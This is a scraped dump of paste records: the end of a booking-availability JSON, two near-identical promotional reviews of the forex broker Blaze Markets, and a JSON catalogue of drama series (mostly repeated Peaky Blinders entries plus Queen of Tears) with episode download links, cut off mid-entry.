          ""limitPer"": ""SLOT"",
          ""limit"": null
        }
      ]
    }
  },
  ""dateSlotAvailabilityList"": [
    {
      ""date"": ""2024-05-18 00:00:00"",
      ""slotAvailabilityList"": [
        {
          ""startTime"": ""00:00:00"",
          ""endTime"": ""00:14:59"",
          ""isUnavailable"": true
        }
      ]
    }
  ]
}"
5skKcvTJ,Review Blaze Markets,fxvnpro,PHP,Friday 17th of May 2024 06:33:57 AM CDT,"https://www.fxvnpro.com/review-blaze-markets/
 
Blaze Markets was born out of the need to have a trading environment that is efficient and beneficial to the trader. Blaze Markets was founded to improve the overall trading experience for investors – one that helps facilitate trading success.



Blaze Markets strives to be the one-stop destination for traders where they can access a superior trading platform and trade CFDs, Forex, Commodities, Indices, Cryptocurrency, and more – all from a single account.



Our mission is to provide a trading environment with competitive pricing and the most advanced tech so you can get in and out of trades fast and efficiently. This means fast execution speeds, reduced slippage, and as low as 0.0 pip spreads.



That which sets us apart from other trading platforms is our deep insight into what our traders need. Traders trade with confidence as we offer them a combination of pricing, cutting-edge platforms, execution speed, wide range of products, market analysis and customer support.



Broker Logo &nbsp;



BROKER INFORMATION



Broker Type-CompanyBlaze Markets LtdFoundation2020CountrySaint Vincent and the GrenadinesRegulationBlaze Markets Ltd is registered by the Financial Services Authority (FSA) of St. Vincent &amp; the Grenadines asan International Business Company with the registration number 26027 BC 2020.Minimum Initial Deposit$100Account Base CurrenciesUSDAccount Deposit MethodsVisa, Master Card, Wire Transfer, Tether Account Withdrawal MethodsVisa, Master Card, Wire Transfer, Tether Live ChatNoEmailsupport@blazemarkets.comCall+1-646-873-6888



ADVANTAGES



Free Demo AccountYesSpreadsFrom 0.0 pipsStop Out Level50%Execution TypeMarket ExecutionIntroducing Brokers ProgramYesSwap FreeNoPromotionsNoTrading Platforms&nbsp;MetaTrader 4ScalpingYesHedgingYesExpert AdvisorsYesProductsForex, Metals , Indices, Crypto



DISADVANTAGES



RestrictionsBlaze Markets does not accept clients from the U.S., Iraq, Sudan, Syria and North Korea.
"
jJRTtgNC,Review Blaze Markets,reviewbrokers,PHP,Friday 17th of May 2024 06:33:45 AM CDT,"https://www.reviewbrokers.net/review-blaze-markets/
 
Blaze Markets was born out of the need to have a trading environment that is efficient and beneficial to the trader. Blaze Markets was founded to improve the overall trading experience for investors – one that helps facilitate trading success.



Blaze Markets strives to be the one-stop destination for traders where they can access a superior trading platform and trade CFDs, Forex, Commodities, Indices, Cryptocurrency, and more – all from a single account.



Our mission is to provide a trading environment with competitive pricing and the most advanced tech so you can get in and out of trades fast and efficiently. This means fast execution speeds, reduced slippage, and as low as 0.0 pip spreads.



That which sets us apart from other trading platforms is our deep insight into what our traders need. Traders trade with confidence as we offer them a combination of pricing, cutting-edge platforms, execution speed, wide range of products, market analysis and customer support.



Broker Logo &nbsp;







Broker Type-CompanyBlaze Markets LtdFoundation2020CountrySaint Vincent and the GrenadinesRegulationBlaze Markets Ltd is registered by the Financial Services Authority (FSA) of St. Vincent &amp; the Grenadines asan International Business Company with the registration number 26027 BC 2020.The JurisdictionsBlaze Markets does not accept clients from the U.S., Iraq, Sudan, Syria and North Korea.Live ChatNoEmailsupport@blazemarkets.comCall+1-646-873-6888







Free Demo AccountsYesMinimum Initial Deposit$100Multi-Currency AccountUSDSpreadsFrom 0.0 pipsStop Out Level50%Introducing Brokers ProgramYesSwap FreeNoPromotionsNoTrading Platforms&nbsp;MetaTrader 4ScalpingYesHedgingYesExpert AdvisorsYesAccount Funding MethodsVisa, Master Card, Wire Transfer, Tether 
"
iQQ2M4aU,KDrama (Biram),AhmadXploit,Dart,Friday 17th of May 2024 06:19:02 AM CDT,"{
  ""kdramas"": [
    {
      ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAN7J_3cOH6eGQlYsIUY4f5qBhL8rqaW7ZVg&usqp=CAU"",
      ""title"": ""Peaky Blinders 1"",
      ""hashtag"": ""2016 | Action | Family | 18+"",
      ""synopsis"": ""Ada seorang prajurit....."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""oVzVdvGIC7U"",
         ""seasons"": ""Season 1"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S1 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S1 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""uIJ07Wg5i0k"",
         ""seasons"": ""Season 2"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S2 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S2 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""t5D4-nTAWLY"",
         ""seasons"": ""Season 3"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S3 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S3 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""q7TTegtooUo"",
         ""seasons"": ""Season 4"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S4 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S4 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""Ruyl8_PT_y8"",
         ""seasons"": ""Season 5"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S5 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S5 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""PxZ5gGfPtCQ"",
         ""seasons"": ""Season 6"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S6 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S6 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		}
	  ]
    },
    {
      ""imgUrl"": ""https://s2.lk21static.xyz/wp-content/uploads/2024/03/film-queen-of-tears-2024-lk21-d21.jpg"",
      ""videoId"": ""Gg2D8zrzlOA"",
      ""title"": ""Queen of Tears"",
      ""hashtag"": ""2024 | Drama | Family | Romance"",
      ""synopsis"": ""Kisah cinta ajaib tentang pasangan suami istri yang mengatasi krisis yang memusingkan."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHjr5uMdYadSgCRqk7AlJKCspoCEl0JQ0U_ZoWO-jzap7MkoVMbXk5qJo&s=10"",
         ""videoId"": ""Gg2D8zrzlOA"",
         ""seasons"": ""Season Done"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""E1"",
			  ""urlDownload"": ""https://emturbovid.com/d/k0HMhP45CEe1ChaSjunM""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""E2"",
			  ""urlDownload"": ""https://emturbovid.com/d/2vk7rviKKebgHbzGjlVp""
			},
			{
			  ""episode"": ""Episode 3"",
			  ""se"": ""E3"",
			  ""urlDownload"": ""https://emturbovid.com/d/LcSUk7EUvJS57AWFrfBQ""
			},
			{
			  ""episode"": ""Episode 4"",
			  ""se"": ""E4"",
			  ""urlDownload"": ""https://emturbovid.com/d/qE7aKsztMDH1lYdReviK""
			},
			{
			  ""episode"": ""Episode 5"",
			  ""se"": ""E5"",
			  ""urlDownload"": ""https://emturbovid.com/d/s9n3JRRrWO5xa4wMLPpM""
			},
			{
			  ""episode"": ""Episode 6"",
			  ""se"": ""E6"",
			  ""urlDownload"": ""https://emturbovid.com/d/v6jpKPLfoWBYHMiXXh12""
			},
			{
			  ""episode"": ""Episode 7"",
			  ""se"": ""E7"",
			  ""urlDownload"": ""https://emturbovid.com/d/w0HDRrFO320NxWQChNRo""
			},
			{
			  ""episode"": ""Episode 8"",
			  ""se"": ""E8"",
			  ""urlDownload"": ""https://emturbovid.com/d/KXT9SmZ7XJ1t0O7FS0sK""
			},
			{
			  ""episode"": ""Episode 9"",
			  ""se"": ""E9"",
			  ""urlDownload"": ""https://emturbovid.com/d/03hcPu8lsmkLjbB4npE6""
			},
			{
			  ""episode"": ""Episode 10"",
			  ""se"": ""E10"",
			  ""urlDownload"": ""https://emturbovid.com/d/smhaZfRJF2ujSsMyVd00""
			},
			{
			  ""episode"": ""Episode 11"",
			  ""se"": ""E11"",
			  ""urlDownload"": ""https://emturbovid.com/d/BwkIJGA4lCYWURnlOeHJ""
			},
			{
			  ""episode"": ""Episode 12"",
			  ""se"": ""E12"",
			  ""urlDownload"": ""https://filelions.site/download/l38jn4u9bkv0_n""
			},
			{
			  ""episode"": ""Episode 13"",
			  ""se"": ""E13"",
			  ""urlDownload"": ""https://emturbovid.com/d/NqpTrO3ZTD5hXIPyyiND""
			},
			{
			  ""episode"": ""Episode 14"",
			  ""se"": ""E14"",
			  ""urlDownload"": ""https://emturbovid.com/d/usu1Zm91LRP2E5VHWDlg""
			},
			{
			  ""episode"": ""Episode 15"",
			  ""se"": ""E15"",
			  ""urlDownload"": ""https://emturbovid.com/d/662d3620e087a""
			},
			{
			  ""episode"": ""Episode 16"",
			  ""se"": ""E16"",
			  ""urlDownload"": ""https://emturbovid.com/d/662e84627ec60""
			}
		  ]
		}
	  ]
    },
    {
      ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAN7J_3cOH6eGQlYsIUY4f5qBhL8rqaW7ZVg&usqp=CAU"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""title"": ""Peaky Blinders 3"",
      ""hashtag"": ""2016 | Action | Family | 18+"",
      ""synopsis"": ""Ada seorang prajurit....."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 1"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S1 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S1 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 2"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S2 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S2 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		}
	  ]
    },
    {
      ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAN7J_3cOH6eGQlYsIUY4f5qBhL8rqaW7ZVg&usqp=CAU"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""title"": ""Peaky Blinders 4"",
      ""hashtag"": ""2016 | Action | Family | 18+"",
      ""synopsis"": ""Ada seorang prajurit....."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 1"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S1 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S1 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 2"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S2 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S2 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		}
	  ]
    },
    {
      ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAN7J_3cOH6eGQlYsIUY4f5qBhL8rqaW7ZVg&usqp=CAU"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""title"": ""Peaky Blinders 3"",
      ""hashtag"": ""2016 | Action | Family | 18+"",
      ""synopsis"": ""Ada seorang prajurit....."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 1"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S1 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S1 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 2"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S2 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S2 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		}
	  ]
    },
    {
      ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAN7J_3cOH6eGQlYsIUY4f5qBhL8rqaW7ZVg&usqp=CAU"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""title"": ""Peaky Blinders 4"",
      ""hashtag"": ""2016 | Action | Family | 18+"",
      ""synopsis"": ""Ada seorang prajurit....."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 1"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S1 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S1 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 2"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S2 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S2 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		}
	  ]
    },
    {
      ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAN7J_3cOH6eGQlYsIUY4f5qBhL8rqaW7ZVg&usqp=CAU"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""title"": ""Peaky Blinders 3"",
      ""hashtag"": ""2016 | Action | Family | 18+"",
      ""synopsis"": ""Ada seorang prajurit....."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 1"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S1 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S1 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 2"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S2 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S2 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		}
	  ]
    },
    {
      ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAN7J_3cOH6eGQlYsIUY4f5qBhL8rqaW7ZVg&usqp=CAU"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""title"": ""Peaky Blinders 4"",
      ""hashtag"": ""2016 | Action | Family | 18+"",
      ""synopsis"": ""Ada seorang prajurit....."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 1"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S1 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S1 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 2"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S2 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S2 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		}
	  ]
    },
    {
      ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAN7J_3cOH6eGQlYsIUY4f5qBhL8rqaW7ZVg&usqp=CAU"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""title"": ""Peaky Blinders 3"",
      ""hashtag"": ""2016 | Action | Family | 18+"",
      ""synopsis"": ""Ada seorang prajurit....."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 1"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S1 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S1 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 2"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S2 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S2 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		}
	  ]
    },
    {
      ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAN7J_3cOH6eGQlYsIUY4f5qBhL8rqaW7ZVg&usqp=CAU"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""title"": ""Peaky Blinders 4"",
      ""hashtag"": ""2016 | Action | Family | 18+"",
      ""synopsis"": ""Ada seorang prajurit....."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 1"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S1 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S1 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 2"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S2 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S2 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		}
	  ]
    },
    {
      ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAN7J_3cOH6eGQlYsIUY4f5qBhL8rqaW7ZVg&usqp=CAU"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""title"": ""Peaky Blinders 4"",
      ""hashtag"": ""2016 | Action | Family | 18+"",
      ""synopsis"": ""Ada seorang prajurit....."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 1"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S1 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S1 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 2"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S2 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S2 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		}
	  ]
    },
    {
      ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAN7J_3cOH6eGQlYsIUY4f5qBhL8rqaW7ZVg&usqp=CAU"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""title"": ""Peaky Blinders 4"",
      ""hashtag"": ""2016 | Action | Family | 18+"",
      ""synopsis"": ""Ada seorang prajurit....."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 1"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S1 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S1 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 2"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S2 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S2 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		}
	  ]
    },
    {
      ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAN7J_3cOH6eGQlYsIUY4f5qBhL8rqaW7ZVg&usqp=CAU"",
      ""videoId"": ""ONHBaC-pfsk"",
